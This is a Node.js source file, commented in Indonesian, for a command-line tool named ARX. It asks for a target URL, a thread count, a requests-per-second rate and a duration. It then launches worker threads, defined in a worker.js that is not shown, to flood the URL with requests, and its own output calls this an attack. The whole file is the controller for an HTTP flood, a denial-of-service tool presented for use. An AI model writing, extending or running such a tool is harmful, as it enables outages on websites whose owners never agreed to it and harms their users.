const readline = require('readline');
const { Worker } = require('worker_threads');
const path = require('path');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.log('Selamat datang di ARX - Advanced Request eXecutor\n');

let targetIdCounter = 0;
const activeTargets = new Map(); // targetId -> { target, workers, stats }
const baseStatLine = 2; // mulai dari baris 2 setelah welcome

// Simpan last cursor position agar prompt selalu di bawah statistik
let promptLine = baseStatLine;

function moveCursor(line) {
  readline.cursorTo(process.stdout, 0, line);
  readline.clearLine(process.stdout, 0);
}

function printAllStats() {
  const targetsSorted = Array.from(activeTargets.keys()).sort((a,b) => a - b);
  targetsSorted.forEach((id, idx) => {
    const { stats } = activeTargets.get(id);
    const sent = stats.sent || 0;
    const success = stats.success || 0;
    const failed = stats.failed || 0;

    moveCursor(baseStatLine + idx);
    process.stdout.write(`[STATS #${id}] Sent: ${sent} | Success: ${success} | Failed: ${failed}     `);
  });
}

function updatePromptLine() {
  const count = activeTargets.size;
  promptLine = baseStatLine + count + 1;
}

function showPrompt() {
  updatePromptLine();
  moveCursor(promptLine);
  rl.prompt(true);
}

function askTargetInput(callback) {
  rl.question('Target URL: ', (url) => {
    if (!url.trim()) return askTargetInput(callback);
    rl.question('Threads (default 10): ', (threads) => {
      rl.question('RPS (default 100): ', (rps) => {
        rl.question('Duration in seconds (default 30): ', (duration) => {
          callback({
            url: url.trim(),
            threads: parseInt(threads) || 10,
            rps: parseInt(rps) || 100,
            duration: parseInt(duration) || 30,
          });
        });
      });
    });
  });
}

function startTarget(target) {
  const id = targetIdCounter++;
  console.log(`\n[INFO] Starting attack on ${target.url} for ${target.duration}s with ${target.threads} threads at ${target.rps} RPS.`);

  const stats = { sent: 0, success: 0, failed: 0 };
  const workers = [];

  activeTargets.set(id, { target, workers, stats });

  // Buat tiap worker
  for (let i = 0; i < target.threads; i++) {
    const worker = new Worker(path.resolve(__dirname, 'worker.js'), {
      workerData: {
        id: i,
        url: target.url,
        rps: Math.floor(target.rps / target.threads),
        duration: target.duration
      }
    });

    worker.on('message', (msg) => {
      if (msg.stat) {
        // Update stats agregat
        stats.sent += msg.sentDelta || 0;
        stats.success += msg.successDelta || 0;
        stats.failed += msg.failedDelta || 0;

        printAllStats();
        showPrompt();
      }
    });

    worker.on('error', (err) => {
      console.error(`[ERROR] Worker #${i} target#${id} error: ${err.message}`);
    });

    workers.push(worker);
  }

  // Timer hapus target setelah selesai durasi
  setTimeout(() => {
    activeTargets.delete(id);
    printAllStats();
    showPrompt();
    console.log(`\n[INFO] Target #${id} finished: ${target.url}`);
  }, target.duration * 1000);
}

console.log('Input target untuk mulai:');
askTargetInput((target) => {
  startTarget(target);
  showPrompt();
  rl.setPrompt('Command (next/stop): ');
  rl.prompt();
});

rl.on('line', (line) => {
  const input = line.trim().toLowerCase();
  if (input === 'next') {
    askTargetInput((target) => {
      startTarget(target);
      showPrompt();
    });
  } else if (input === 'stop') {
    console.log('\n[INFO] Stopping input. Existing targets continue running.');
    rl.close();
  } else {
    rl.prompt();
  }
});

rl.on('close', () => {
  console.log('\n[INFO] Exiting ARX. Bye!');
  process.exit(0);
});
